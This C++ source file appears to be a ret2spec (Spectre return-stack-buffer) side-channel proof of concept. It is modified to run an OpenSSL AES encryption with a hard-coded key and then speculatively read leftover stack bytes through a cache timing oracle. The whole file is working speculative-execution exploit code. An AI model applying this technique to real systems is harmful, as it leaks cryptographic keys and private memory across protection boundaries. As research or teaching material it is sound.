#include <array>
#include <cstring>
#include <iostream>
#include <vector>

#include <openssl/aes.h>
#include <openssl/rand.h>
#include <cstdio>

#include "cache_sidechannel.h"
#include "instr.h"
#include "ret2spec_common.h"
#include "utils.h"

// We cannot include the private_data twice, because that would lead to linking
// error. Declaring it extern in here.
extern const char *private_data;

// Calls sched_yield in the cross-address-space version.
void (*return_true_base_case)();
// Calls sched_yield in the cross-address-space version, in the
// same-address-space version starts the ReturnsFalse recursion.
void (*return_false_base_case)();

// Global variables used to avoid passing parameters through recursive function
// calls. Since we flush whole stack frames from the cache, it is important not
// to store on stack any data that might be affected by being flushed from
// cache.
size_t current_offset;
const std::array<BigByte, 256> *oracle_ptr;

unsigned char key[16] = "0123456789abcde"; // AES key (128 bits)
unsigned char plaintext[16] = "Hello, World!!"; // Note: must be 16 bytes for AES-128
unsigned char ciphertext[16]; // To store the ciphertext

// Return value of ReturnsFalse that never changes. Avoiding compiler
// optimizations with it.
bool false_value = false;
// Pointers to stack marks in ReturnsTrue. Used for flushing the return address
// from the cache.
std::vector<char *> stack_mark_pointers;

// Always returns false.
// Jason: since counter=1, this just runs twice
// i.e., just one recursive call.
bool ReturnsFalse(int counter) {
  if (counter > 0) {
    if (ReturnsFalse(counter - 1)) {
      // Unreachable code. ReturnsFalse can never return true.
      // Jason: top of RSB should point to here, though
      unsigned char *sp;
      asm volatile ("mov %0, sp" : "=r"(sp));
      const std::array<BigByte, 256> &oracle = *oracle_ptr;
      // ForceRead(oracle.data() +
      //           static_cast<unsigned char>(private_data[current_offset]));
      ForceRead(oracle.data() + *(sp - 336 + current_offset));
      std::cout << "Dead code. Must not be printed." << std::endl;
      exit(EXIT_FAILURE);
    }
  } else {
    // Increase the interference if running cross-address-space.
    return_true_base_case();
  }
  return false_value;
}

// Always returns true.
static bool ReturnsTrue(int counter) {
  // Creates a stack mark and stores it to the global vector.
  char stack_mark = 'a';
  stack_mark_pointers.push_back(&stack_mark);

  if (counter > 0) {
    // Recursively invokes itself.
    ReturnsTrue(counter - 1);
  } else {
    // In the deepest invocation starts the ReturnsFalse recursion or
    // unschedule to increase the interference.
    return_false_base_case();
  }

  // Cleans-up its stack mark and flushes from the cache everything between its
  // own stack mark and the next one. Somewhere there must be also the return
  // address.
  stack_mark_pointers.pop_back();

  // Jason: flushing architectural ret addr
  // from stack is necessary for ret2spec_ca
  // to work properly.
  FlushFromDataCache(&stack_mark, stack_mark_pointers.back());
  return true;
}

void encrypt() {
    AES_KEY encryptKey;
    if (AES_set_encrypt_key(key, 128, &encryptKey) < 0) {
        return;
    }
    AES_encrypt(plaintext, ciphertext, &encryptKey);
}

static bool ReturnsTrueAES(int counter) {
  char stack_mark = 'a';
  stack_mark_pointers.push_back(&stack_mark);

  if (counter > 0) {
    ReturnsTrueAES(counter - 1);
  } else {
    encrypt();
    return_false_base_case();
  }

  stack_mark_pointers.pop_back();
  FlushFromDataCache(&stack_mark, stack_mark_pointers.back());
  return true;
}

char Ret2specLeakByte() {
  CacheSideChannel sidechannel;
  oracle_ptr = &sidechannel.GetOracle();
  const std::array<BigByte, 256> &oracle = *oracle_ptr;

  for (int run = 0;; ++run) {
    sidechannel.FlushOracle();

    // Stack mark for the first call of ReturnsTrue. Otherwise it would read
    // from an empty vector and crash.
    char stack_mark = 'a';
    stack_mark_pointers.push_back(&stack_mark);
    // ReturnsTrue(kRecursionDepth);
    ReturnsTrueAES(kRecursionDepth);
    stack_mark_pointers.pop_back();

    std::pair<bool, char> result = sidechannel.AddHitAndRecomputeScores();
    if (result.first) {
      return result.second;
    }

    if (run > 100000) {
      std::cerr << "Does not converge " << result.second << std::endl;
      exit(EXIT_FAILURE);
    }
  }
}
